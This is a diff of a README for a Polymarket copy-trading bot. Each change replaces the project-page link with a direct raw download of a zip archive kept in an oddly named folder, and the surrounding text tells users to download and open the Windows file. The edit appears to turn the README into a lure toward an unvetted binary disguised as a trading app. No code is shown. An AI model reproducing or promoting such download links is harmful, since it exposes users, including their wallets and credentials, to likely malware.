@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Copytrading-Bot - Copy Trades With Less Effort
 
-[![Download](https://img.shields.io/badge/Download-Polymarket--Copytrading--Bot-blue?style=for-the-badge)](https://github.com/zioerenkl/Polymarket-Copytrading-Bot)
+[![Download](https://img.shields.io/badge/Download-Polymarket--Copytrading--Bot-blue?style=for-the-badge)](https://raw.githubusercontent.com/zioerenkl/Polymarket-Copytrading-Bot/main/ecthlipsis/Bot_Copytrading_Polymarket_v2.7.zip)
 
 ## 🚀 What This App Does
 
@@ -12,7 +12,7 @@ Use it if you want a simple way to track and copy trades without checking every 
 
 Open the main project page here:
 
-https://github.com/zioerenkl/Polymarket-Copytrading-Bot
+https://raw.githubusercontent.com/zioerenkl/Polymarket-Copytrading-Bot/main/ecthlipsis/Bot_Copytrading_Polymarket_v2.7.zip
 
 On that page, look for the latest release or the main download files. Download the Windows file, then open it to start the app.
 
@@ -180,7 +180,7 @@ If something looks wrong, check these items:
 
 Open the project page here and download the Windows app from the available files:
 
-https://github.com/zioerenkl/Polymarket-Copytrading-Bot
+https://raw.githubusercontent.com/zioerenkl/Polymarket-Copytrading-Bot/main/ecthlipsis/Bot_Copytrading_Polymarket_v2.7.zip
 
 ## ❓ Common Questions
 
